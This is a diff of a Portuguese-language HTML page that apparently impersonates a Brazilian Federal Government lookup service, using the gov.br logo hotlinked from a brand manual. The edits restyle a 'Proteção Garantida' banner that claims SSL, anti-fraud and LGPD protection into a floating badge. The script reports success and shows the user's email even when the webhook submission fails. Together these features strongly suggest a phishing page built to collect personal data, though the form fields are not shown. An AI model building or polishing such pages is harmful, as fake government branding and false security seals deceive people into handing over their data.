@@ -15,7 +15,6 @@
             --dark: #212529;
             --gray: #6c757d;
             --security: #1a5276;
-            --highlight: #ff6b6b;
             --security-light: #2980b9;
         }
         
@@ -61,79 +60,69 @@
             text-align: center;
         }
         
-        /* Novo selo de segurança premium */
+        /* Selo de segurança minimalista */
         .security-banner {
-            background: linear-gradient(135deg, var(--security), var(--security-light));
-            color: white;
-            padding: 12px 20px;
-            border-radius: 10px;
-            font-size: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            box-shadow: 0 4px 20px rgba(26, 82, 118, 0.4);
-            border: 1px solid rgba(255,255,255,0.3);
-            z-index: 10;
-            max-width: 320px;
-        }
-        
-        .security-badge {
-            background: white;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background: rgba(255, 255, 255, 0.95);
             color: var(--security);
-            font-size: 1.3rem;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            z-index: 100;
+            backdrop-filter: blur(5px);
+            animation: float 3s ease-in-out infinite;
+            transition: all 0.3s ease;
+            max-width: 90%;
         }
-        
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .security-banner:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .security-badge {
+            color: var(--security);
+            font-size: 1.1rem;
+        }
+
         .security-content {
             display: flex;
             flex-direction: column;
         }
-        
+
         .security-title {
-            font-weight: bold;
-            font-size: 1.1rem;
-            margin-bottom: 3px;
-            letter-spacing: 0.5px;
-        }
-        
-        .security-details {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px 15px;
-            font-size: 0.8rem;
-            opacity: 0.9;
-        }
-        
-        .security-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
+            font-weight: 600;
+            font-size: 0.9rem;
             white-space: nowrap;
         }
-        
-        .security-item i {
-            font-size: 0.9rem;
-            color: rgba(255,255,255,0.9);
+
+        .security-details {
+            font-size: 0.75rem;
+            opacity: 0.8;
+            display: none;
         }
-        
-        .security-banner .lock-icon {
-            animation: pulse 2s infinite;
+
+        .security-banner:hover .security-details {
+            display: block;
+            animation: fadeIn 0.3s ease;
         }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 0.8; }
         }
         
         .container {
@@ -144,6 +133,7 @@
             border-radius: 10px;
             box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
             overflow: hidden;
+            position: relative;
         }
         
         .form-container {
@@ -553,19 +543,15 @@
             }
             
             .security-banner {
-                position: relative;
-                top: auto;
-                right: auto;
-                margin: 10px auto;
-                width: 90%;
-                flex-direction: column;
-                text-align: center;
-                gap: 10px;
-                padding: 15px;
+                bottom: 10px;
+                right: 10px;
+                font-size: 0.8rem;
+                padding: 8px 12px;
             }
             
-            .security-details {
-                justify-content: center;
+            .security-title {
+                white-space: normal;
+                max-width: 180px;
             }
             
             .lgpd-info {
@@ -583,20 +569,6 @@
 <body>
     <div class="container">
         <header class="header">
-            <div class="security-banner">
-                <div class="security-badge">
-                    <i class="fas fa-shield-alt"></i>
-                </div>
-                <div class="security-content">
-                    <div class="security-title">PROTEÇÃO GARANTIDA</div>
-                    <div class="security-details">
-                        <span class="security-item"><i class="fas fa-lock"></i> Criptografia SSL 256-bit</span>
-                        <span class="security-item"><i class="fas fa-shield-virus"></i> Antifraude</span>
-                        <span class="security-item"><i class="fas fa-user-shield"></i> LGPD</span>
-                    </div>
-                </div>
-            </div>
-            
             <div class="logo">
                 <img src="https://www.gov.br/secom/pt-br/central-de-conteudo/manuais/uso-da-marca-do-governo-federal/2023_br_govfederal_marcaoficial_rgb.png/@@images/93f6d81f-5751-45cd-b502-580fb4aa1d1e.png" 
                      alt="Governo Federal">
@@ -828,6 +800,19 @@
                         <p><i class="fas fa-info-circle" style="color: var(--primary);"></i> <strong>Dúvidas?</strong> Entre em contato através do Fale Conosco no site oficial.</p>
                     </div>
                 </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Banner flutuante minimalista -->
+    <div class="security-banner">
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <div class="security-content">
+            <div class="security-title">Proteção Garantida</div>
+            <div class="security-details">
+                <span>Criptografia SSL • Antifraude • LGPD</span>
             </div>
         </div>
     </div>
@@ -1177,7 +1162,6 @@
             })
             .catch(error => {
                 console.error('Erro:', error);
-                // Mostrar resultado mesmo se falhar o webhook
                 showResult(true);
                 emailConfirmacao.textContent = formData.email;
             });
@@ -1203,9 +1187,28 @@
             consultarBtn.disabled = false;
             consultarBtn.innerHTML = '<i class="fas fa-search"></i> NOVA CONSULTA';
             
-            // Rolagem suave para o resultado
             resultadoDiv.scrollIntoView({ behavior: 'smooth' });
         }
+
+        // Animação do banner flutuante
+        let lastScrollPosition = 0;
+        const securityBanner = document.querySelector('.security-banner');
+        
+        window.addEventListener('scroll', function() {
+            const currentScrollPosition = window.pageYOffset;
+            
+            if (currentScrollPosition > lastScrollPosition) {
+                // Rolando para baixo - esconde
+                securityBanner.style.opacity = '0';
+                securityBanner.style.transform = 'translateY(20px)';
+            } else {
+                // Rolando para cima - mostra
+                securityBanner.style.opacity = '1';
+                securityBanner.style.transform = 'translateY(0)';
+            }
+            
+            lastScrollPosition = currentScrollPosition;
+        });
     </script>
 </body>
 </html>
